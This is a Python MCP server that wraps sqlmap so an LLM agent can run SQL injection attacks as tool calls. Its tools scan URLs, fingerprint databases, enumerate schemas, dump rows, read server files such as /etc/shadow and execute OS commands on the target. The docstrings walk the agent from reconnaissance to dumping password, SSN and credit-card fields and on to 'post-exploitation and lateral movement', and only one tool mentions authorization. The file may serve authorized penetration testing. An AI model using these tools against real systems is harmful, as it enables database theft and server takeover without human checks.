import subprocess
import os

# To silence all terminal logging
# import sys
# sys.stderr = open(os.devnull, "w")

from fastmcp import FastMCP

# Initialize the MCP Server
mcp = FastMCP("SQLMap MCP Server")

# Maximum characters to return to the LLM to prevent context window exhaustion
MAX_OUTPUT_CHARS = 15000

# Flask instance sqlmap directory 
root_dir=os.getcwd()
OUTPUT_DIR = os.path.join(root_dir, "instance", "sqlmap")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def run_command(args: list[str], timeout: int) -> str:
    """
    Helper function to execute sqlmap and capture output.
    """
    # Force batch mode (no interactive prompts) and disable colors (save tokens)
    if "--batch" not in args: args.append("--batch")
    if "--disable-coloring" not in args: args.append("--disable-coloring")
    if "--output-dir" not in args: args.extend(["--output-dir", OUTPUT_DIR])

    cmd = ["sqlmap"] + args
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = result.stdout
        if result.stderr:
            output += f"\n[SQLMAP STDERR]\n{result.stderr}"
            
        # SQLMap Exit Codes: 0=Success, 1=Error, 2=No injection found.
        # We treat 0 and 2 as "successful" runs so the LLM can read the conclusion.
        if result.returncode not in (0, 2):
            output += f"\n[SQLMAP EXIT CODE: {result.returncode}]\n"
            
        # Smart Truncation Logic
        if len(output) > MAX_OUTPUT_CHARS:
            half = MAX_OUTPUT_CHARS // 2
            output = (
                output[:half] + 
                f"\n\n... [TRUNCATED: Output exceeded {MAX_OUTPUT_CHARS} characters] ...\n\n" + 
                output[-half:]
            )
            
        return output.strip() or "No output returned."
        
    except subprocess.TimeoutExpired:
        return f"Error: SQLMap scan timed out after {timeout} seconds."
    except FileNotFoundError:
        return "Error: 'sqlmap' command not found. Please ensure it is installed and in your system PATH."
    except Exception as e:
        return f"An unexpected OS-level error occurred: {str(e)}"

@mcp.tool()
def scan_url(
    url: str,
    data: str = "",
    cookie: str = "",
    level: int = 1,
    risk: int = 1,
    technique: str = "BEUSTQ",
    timeout: int = 300
) -> str:
    """
    Scan a target URL for SQL injection vulnerabilities. This is the primary 
    reconnaissance tool to find injectable parameters (GET, POST, Cookies, Headers).
    Use this tool first to confirm an injection point exists.
    
    Args:
        url: The target URL with parameters to test (e.g., 'http://target.com/index.php?id=1').
        data: The URL-encoded POST body data if testing a form submission (e.g., 'username=admin&password=pass').
        cookie: HTTP cookies required for authenticated endpoints (e.g., 'session=abc123; token=xyz').
        level: SQLMap test level (1-5). Higher levels test more payloads and injection points (like HTTP headers).
        risk: SQLMap test risk (1-3). Higher risk includes heavier queries (like UPDATE/INSERT) that might alter database state.
        technique: SQL injection techniques to use (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline).
        timeout: Maximum seconds to run the scan.
    """
    args = ["-u", url, "--level", str(level), "--risk", str(risk), "--technique", technique]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def get_banner(url: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    Retrieve the database banner (DBMS type, exact version, underlying OS). 
    Use this immediately after confirming a vulnerability to identify the exact 
    database engine (e.g., MySQL 8.0, PostgreSQL 14) before enumerating schemas.
    
    Args:
        url: The vulnerable target URL.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--banner"]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def get_current_user(url: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    Retrieve the current database user executing the queries (e.g., 'root', 'sa', 'postgres'). 
    Use this to assess privilege levels and determine if the injection point has administrative access.
    
    Args:
        url: The vulnerable target URL.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--current-user"]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def get_current_db(url: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    Retrieve the name of the currently selected default database. 
    Use this to quickly identify which database context the application is 
    currently using before enumerating all available databases.
    
    Args:
        url: The vulnerable target URL.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--current-db"]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def enumerate_databases(url: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    List all available databases on the database server. 
    Use this after identifying the DBMS to map out the entire server structure 
    and find hidden or secondary databases that might contain sensitive data.
    
    Args:
        url: The vulnerable target URL.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--dbs"]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def enumerate_tables(url: str, database: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    List all tables within a specific database. 
    Requires the target 'database' name (found via enumerate_databases). 
    Use this to map out the schema structure before dumping specific data.
    
    Args:
        url: The vulnerable target URL.
        database: The exact name of the database to enumerate tables from.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--tables", "-D", database]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def enumerate_columns(url: str, database: str, table: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    List all columns within a specific table. 
    Requires both the 'database' and 'table' names. Use this to identify which 
    specific fields (like 'password', 'ssn', 'credit_card') exist before dumping the actual row data.
    
    Args:
        url: The vulnerable target URL.
        database: The exact name of the database.
        table: The exact name of the table to enumerate columns from.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--columns", "-D", database, "-T", table]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def dump_table(
    url: str,
    database: str,
    table: str,
    columns: str = "",
    where: str = "",
    start: int = 0,
    stop: int = 10, 
    data: str = "",
    cookie: str = "",
    timeout: int = 300
) -> str:
    """
    Extract actual row data from a specific table. 
    WARNING: Tables can be massive. Always use 'start' and 'stop' to paginate results 
    (default is first 10 rows) to prevent crashing the LLM context window. 
    Use the 'columns' argument to only extract specific fields instead of the whole row.
    
    Args:
        url: The vulnerable target URL.
        database: The exact name of the database.
        table: The exact name of the table to dump.
        columns: Comma-separated list of specific columns to dump (e.g., 'username,password').
        where: SQL WHERE condition to filter results (e.g., "id=1" or "role='admin'").
        start: The starting row number for pagination (default 0).
        stop: The ending row number for pagination (default 10).
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--dump", "-D", database, "-T", table, "--start", str(start), "--stop", str(stop)]
    if columns: args.extend(["-C", columns])
    if where: args.extend(["--where", where])
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def read_file(url: str, file_path: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    Read an arbitrary file from the underlying OS file system of the database server 
    (e.g., '/etc/passwd', '/etc/shadow', or 'C:\\Windows\\win.ini'). 
    Requires the database user to have FILE privileges. Use for post-exploitation and lateral movement.
    
    Args:
        url: The vulnerable target URL.
        file_path: The absolute path to the file on the target server's operating system.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--file-read", file_path]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

@mcp.tool()
def execute_command(url: str, command: str, data: str = "", cookie: str = "", timeout: int = 300) -> str:
    """
    Execute an arbitrary operating system shell command on the underlying database server 
    (e.g., 'whoami', 'ipconfig', 'cat /etc/passwd'). 
    Requires high privileges (like xp_cmdshell in MSSQL or UDFs in MySQL). 
    WARNING: This is highly destructive and noisy. Only use for final post-exploitation 
    verification on strictly authorized targets.
    
    Args:
        url: The vulnerable target URL.
        command: The exact OS shell command to execute on the target server.
        data: URL-encoded POST body data if required.
        cookie: HTTP cookies if authentication is required.
        timeout: Maximum seconds to run.
    """
    args = ["-u", url, "--os-cmd", command]
    if data: args.extend(["--data", data])
    if cookie: args.extend(["--cookie", cookie])
    return run_command(args, timeout)

if __name__ == "__main__":
    mcp.run()